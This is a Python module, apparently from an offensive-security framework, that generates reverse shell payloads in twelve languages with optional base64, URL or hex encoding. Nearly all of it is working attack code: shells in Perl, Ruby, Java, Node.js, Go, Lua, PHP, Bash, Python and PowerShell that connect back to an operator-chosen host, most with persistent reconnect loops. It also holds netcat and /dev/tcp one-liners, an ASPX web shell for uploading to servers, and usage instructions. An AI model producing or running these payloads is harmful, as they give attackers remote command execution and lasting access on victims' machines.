#!/usr/bin/env python3

MODULE_INFO = {
    "name": "Multi-Language Payload Generator",
    "description": "Generate reverse shell payloads in multiple programming languages",
    "author": "Lazy Framework Team",
    "license": "MIT",
    "platform": "multi",
    "arch": "multi",
    "type": "payload_generator",
    "rank": "Excellent",
    "references": [],
    "dependencies": []
}

OPTIONS = {
    "LHOST": {
        "description": "Local IP address to connect back to",
        "required": True,
        "default": "127.0.0.1"
    },
    "LPORT": {
        "description": "Local port to connect back to",
        "required": True,
        "default": "4444"
    },
    "LANGUAGE": {
        "description": "Target language (perl, ruby, java, nodejs, golang, netcat, lua, aspx, php, bash, python, powershell)",
        "required": False,
        "default": "bash"
    },
    "SHELL": {
        "description": "Shell type (cmd, bash, powershell)",
        "required": False,
        "default": "bash"
    },
    "ENCODE": {
        "description": "Encode payload (base64, url, hex, none)",
        "required": False,
        "default": "none"
    },
    "OUTPUT_FILE": {
        "description": "Output filename",
        "required": False,
        "default": ""
    }
}

import os
import sys
import base64
import urllib.parse

class MultiLanguagePayload:
    """Generate payloads in multiple programming languages"""
    
    def __init__(self, options):
        self.options = options
        self.lhost = options.get("LHOST", "127.0.0.1")
        self.lport = int(options.get("LPORT", 4444))
        self.language = options.get("LANGUAGE", "bash")
        self.shell = options.get("SHELL", "bash")
        self.encode = options.get("ENCODE", "none")
        
    def generate_all(self):
        """Generate payloads for all languages"""
        languages = ["perl", "ruby", "java", "nodejs", "golang", "netcat", "lua", "aspx", "php", "bash", "python", "powershell"]
        
        result = {}
        for lang in languages:
            try:
                result[lang] = getattr(self, f"generate_{lang}")()
            except Exception as e:
                result[lang] = f"Error generating {lang}: {str(e)}"
        
        return result
    
    def generate_perl(self):
        """Generate Perl reverse shell"""
        payload = f'''#!/usr/bin/perl
use strict;
use Socket;
use IO::Handle;

my $host = "{self.lhost}";
my $port = {self.lport};

socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
connect(SOCK, sockaddr_in($port, inet_aton($host)));

open(STDIN, "<&SOCK");
open(STDOUT, ">&SOCK");
open(STDERR, ">&SOCK");

system("/bin/sh -i");
close(SOCK);
'''
        
        return self._encode_payload(payload, "perl")
    
    def generate_ruby(self):
        """Generate Ruby reverse shell"""
        payload = f'''#!/usr/bin/ruby
require 'socket'
require 'open3'

host = "{self.lhost}"
port = {self.lport}

begin
  sock = TCPSocket.new(host, port)
  sock.puts "Ruby Reverse Shell Connected"
  
  while line = sock.gets
    Open3.popen2e(line.chomp) do |stdin, stdout_err, wait_thr|
      output = stdout_err.read
      sock.puts output
    end
  end
rescue => e
  sleep 10
  retry
end
'''
        return self._encode_payload(payload, "ruby")
    
    def generate_java(self):
        """Generate Java reverse shell"""
        payload = f'''import java.io.*;
import java.net.*;
import java.util.Scanner;

public class ReverseShell {{
    public static void main(String[] args) {{
        String host = "{self.lhost}";
        int port = {self.lport};
        
        try {{
            Socket socket = new Socket(host, port);
            Scanner socketIn = new Scanner(socket.getInputStream());
            PrintWriter socketOut = new PrintWriter(socket.getOutputStream(), true);
            
            socketOut.println("Java Reverse Shell Connected");
            
            Process process = Runtime.getRuntime().exec("/bin/bash");
            BufferedReader processIn = new BufferedReader(new InputStreamReader(process.getInputStream()));
            BufferedReader processErr = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            PrintWriter processOut = new PrintWriter(process.getOutputStream());
            
            Thread inputThread = new Thread(() -> {{
                try {{
                    String line;
                    while ((line = socketIn.nextLine()) != null) {{
                        processOut.println(line);
                        processOut.flush();
                    }}
                }} catch (Exception e) {{}}
            }});
            
            Thread outputThread = new Thread(() -> {{
                try {{
                    String line;
                    while ((line = processIn.readLine()) != null) {{
                        socketOut.println(line);
                    }}
                }} catch (Exception e) {{}}
            }});
            
            inputThread.start();
            outputThread.start();
            inputThread.join();
            outputThread.join();
            
        }} catch (Exception e) {{
            try {{ Thread.sleep(10000); }} catch (InterruptedException ie) {{}}
            main(args);
        }}
    }}
}}
'''
        return self._encode_payload(payload, "java")
    
    def generate_nodejs(self):
        """Generate Node.js reverse shell"""
        payload = f'''const net = require('net');
const {{ spawn }} = require('child_process');

const host = "{self.lhost}";
const port = {self.lport};

function connect() {{
    const client = new net.Socket();
    
    client.connect(port, host, () => {{
        console.log('Node.js Reverse Shell Connected');
        
        const shell = spawn('/bin/sh', ['-i']);
        
        client.pipe(shell.stdin);
        shell.stdout.pipe(client);
        shell.stderr.pipe(client);
        
        shell.on('close', () => {{
            client.destroy();
            setTimeout(connect, 10000);
        }});
    }});
    
    client.on('close', () => {{
        setTimeout(connect, 10000);
    }});
    
    client.on('error', (err) => {{
        setTimeout(connect, 10000);
    }});
}}

connect();
'''
        return self._encode_payload(payload, "javascript")
    
    def generate_golang(self):
        """Generate Golang reverse shell"""
        payload = f'''package main

import (
    "net"
    "os/exec"
    "time"
)

func main() {{
    for {{
        conn, err := net.Dial("tcp", "{self.lhost}:{self.lport}")
        if err != nil {{
            time.Sleep(10 * time.Second)
            continue
        }}
        
        cmd := exec.Command("/bin/sh")
        cmd.Stdin = conn
        cmd.Stdout = conn
        cmd.Stderr = conn
        cmd.Run()
        
        conn.Close()
        time.Sleep(10 * time.Second)
    }}
}}
'''
        return self._encode_payload(payload, "go")
    
    def generate_netcat(self):
        """Generate Netcat reverse shell"""
        if self.shell == "bash":
            payload = f"bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
        elif self.shell == "cmd":
            payload = f"nc -e cmd {self.lhost} {self.lport}"
        else:
            payload = f"nc -e /bin/sh {self.lhost} {self.lport}"
        
        return self._encode_payload(payload, "bash")
    
    def generate_lua(self):
        """Generate Lua reverse shell"""
        payload = f'''local host = "{self.lhost}"
local port = {self.lport}
local socket = require("socket")

while true do
    local client = socket.tcp()
    local connected, err = client:connect(host, port)
    
    if connected then
        client:send("Lua Reverse Shell Connected\\n")
        
        while true do
            local cmd, err = client:receive()
            if not cmd then break end
            
            local handle = io.popen(cmd, "r")
            local output = handle:read("*a")
            handle:close()
            
            client:send(output)
        end
        
        client:close()
    end
    
    socket.sleep(10)
end
'''
        return self._encode_payload(payload, "lua")
    
    def generate_aspx(self):
        """Generate ASPX web shell"""
        payload = f'''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net.Sockets" %>
<script runat="server">
    void Page_Load(object sender, EventArgs e) {{
        if (Request["cmd"] != null) {{
            string cmd = Request["cmd"];
            if (cmd == "reverse") {{
                StartReverseShell();
            }} else {{
                ExecuteCommand(cmd);
            }}
        }}
    }}
    
    void ExecuteCommand(string cmd) {{
        try {{
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            Process p = Process.Start(psi);
            string output = p.StandardOutput.ReadToEnd();
            Response.Write("<pre>" + Server.HtmlEncode(output) + "</pre>");
        }} catch (Exception ex) {{
            Response.Write("Error: " + ex.Message);
        }}
    }}
    
    void StartReverseShell() {{
        try {{
            string host = "{self.lhost}";
            int port = {self.lport};
            
            using (TcpClient client = new TcpClient(host, port)) {{
                using (NetworkStream stream = client.GetStream()) {{
                    using (StreamReader reader = new StreamReader(stream))
                    using (StreamWriter writer = new StreamWriter(stream)) {{
                        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe");
                        psi.RedirectStandardInput = true;
                        psi.RedirectStandardOutput = true;
                        psi.RedirectStandardError = true;
                        psi.UseShellExecute = false;
                        
                        Process p = Process.Start(psi);
                        
                        Thread inputThread = new Thread(() -> {{
                            try {{
                                string line;
                                while ((line = reader.ReadLine()) != null) {{
                                    p.StandardInput.WriteLine(line);
                                }}
                            }} catch {{}}
                        }});
                        
                        Thread outputThread = new Thread(() -> {{
                            try {{
                                string output;
                                while ((output = p.StandardOutput.ReadLine()) != null) {{
                                    writer.WriteLine(output);
                                    writer.Flush();
                                }}
                            }} catch {{}}
                        }});
                        
                        inputThread.Start();
                        outputThread.Start();
                        inputThread.Join();
                        outputThread.Join();
                    }}
                }}
            }}
        }} catch (Exception ex) {{
            Response.Write("Reverse shell error: " + ex.Message);
        }}
    }}
</script>

<html>
<body>
    <h3>ASPX Web Shell</h3>
    <form method="post">
        <input type="text" name="cmd" style="width: 300px;" placeholder="Enter command or 'reverse' for reverse shell">
        <input type="submit" value="Execute">
    </form>
</body>
</html>
'''
        return self._encode_payload(payload, "aspx")
    
    def generate_php(self):
        """Generate PHP reverse shell"""
        payload = f'''<?php
// PHP Reverse Shell
$host = "{self.lhost}";
$port = {self.lport};

// Method 1: Reverse shell using fsockopen
if (($sock = fsockopen($host, $port)) === false) {{
    exit();
}}

$descriptorspec = array(
    0 => $sock,
    1 => $sock,
    2 => $sock
);

$process = proc_open('/bin/sh', $descriptorspec, $pipes);
proc_close($process);
?>
'''
        return self._encode_payload(payload, "php")
    
    def generate_bash(self):
        """Generate Bash reverse shell"""
        payload = f'''#!/bin/bash
while true; do
    bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1
    sleep 10
done
'''
        return self._encode_payload(payload, "bash")
    
    def generate_python(self):
        """Generate Python reverse shell"""
        payload = f'''#!/usr/bin/env python3
import socket
import subprocess
import os
import time

host = "{self.lhost}"
port = {self.lport}

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        subprocess.call(["/bin/sh", "-i"])
        s.close()
    except:
        time.sleep(10)
'''
        return self._encode_payload(payload, "python")
    
    def generate_powershell(self):
        """Generate PowerShell reverse shell"""
        payload = f'''$host="{self.lhost}"
$port={self.lport}

while ($true) {{
    try {{
        $client = New-Object System.Net.Sockets.TCPClient($host,$port)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{{0}}
        
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as " + $env:username + "`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)
        
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {{
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
            $sendback = (iex $data 2>&1 | Out-String )
            $sendback2 = $sendback + "PS " + (pwd).Path + "> "
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()
        }}
        $client.Close()
    }} catch {{
        Start-Sleep -Seconds 10
    }}
}}
'''
        return self._encode_payload(payload, "powershell")
    
    def _encode_payload(self, payload, language):
        """Encode payload based on encoding option"""
        if self.encode == "base64":
            encoded = base64.b64encode(payload.encode()).decode()
            return f"# Base64 encoded {language} payload\n{encoded}"
        
        elif self.encode == "url":
            encoded = urllib.parse.quote(payload)
            return f"# URL encoded {language} payload\n{encoded}"
        
        elif self.encode == "hex":
            encoded = payload.encode().hex()
            return f"# Hex encoded {language} payload\n{encoded}"
        
        else:
            return payload

def generate(options):
    """Generate payload in specified language"""
    generator = MultiLanguagePayload(options)
    language = options.get("LANGUAGE", "bash")
    
    # Generate specific language or all languages
    if language == "all":
        result = generator.generate_all()
    else:
        try:
            result = {language: getattr(generator, f"generate_{language}")()}
        except AttributeError:
            result = {language: f"Unsupported language: {language}"}
    
    return {
        'payloads': result,
        'info': MODULE_INFO,
        'options_used': {
            'LHOST': generator.lhost,
            'LPORT': generator.lport,
            'LANGUAGE': language,
            'SHELL': generator.shell,
            'ENCODE': generator.encode
        }
    }

def _get_usage_instructions(language):
    """Get usage instructions for specific language"""
    instructions = {
        "perl": "Save as .pl file and run: perl payload.pl",
        "ruby": "Save as .rb file and run: ruby payload.rb", 
        "java": "Compile: javac ReverseShell.java && java ReverseShell",
        "nodejs": "Save as .js file and run: node payload.js",
        "golang": "Compile: go build -o payload payload.go",
        "netcat": "Run directly in terminal",
        "lua": "Save as .lua and run: lua payload.lua",
        "aspx": "Upload to web server as .aspx file",
        "php": "Upload to web server as .php file",
        "bash": "Make executable: chmod +x payload.sh && ./payload.sh",
        "python": "Run: python payload.py",
        "powershell": "Run in PowerShell: .\\payload.ps1"
    }
    return f"  {instructions.get(language, 'Check language documentation')}"

def _save_to_file(payloads, filename):
    """Save payloads to file"""
    with open(filename, 'w', encoding='utf-8') as f:
        for lang, payload in payloads.items():
            f.write(f"=== {lang.upper()} PAYLOAD ===\n")
            f.write(payload)
            f.write("\n\n" + "="*50 + "\n\n")

def run(session, options):
    """Run the multi-language payload generator"""
    from rich.console import Console
    from rich.panel import Panel
    from rich.syntax import Syntax
    
    console = Console()
    
    result = generate(options)
    
    console.print(Panel.fit(
        "[bold green]Multi-Language Payload Generator[/bold green]",
        border_style="green"
    ))
    
    # Display options used
    console.print(f"\n[bold cyan]Options:[/bold cyan]")
    for opt, val in result['options_used'].items():
        console.print(f"  [yellow]{opt}:[/yellow] {val}")
    
    # Display generated payloads
    for lang, payload in result['payloads'].items():
        console.print(f"\n[bold yellow]{lang.upper()} Payload:[/bold yellow]")
        
        # Determine syntax highlighting
        if lang in ["python", "perl", "ruby", "bash", "php"]:
            syntax_lang = lang
        elif lang == "nodejs":
            syntax_lang = "javascript"
        elif lang == "golang":
            syntax_lang = "go"
        elif lang == "aspx":
            syntax_lang = "html"
        elif lang == "powershell":
            syntax_lang = "powershell"
        else:
            syntax_lang = "text"
        
        syntax = Syntax(payload, syntax_lang, theme="monokai", line_numbers=True)
        console.print(syntax)
        
        # Show usage instructions
        console.print(f"[dim]Usage instructions for {lang}:[/dim]")
        console.print(_get_usage_instructions(lang))
    
    # Save to file if requested
    output_file = options.get("OUTPUT_FILE")
    if output_file:
        _save_to_file(result['payloads'], output_file)
        console.print(f"\n[green]✅ Payloads saved to: {output_file}[/green]")

def get_options():
    """Return module options"""
    return OPTIONS
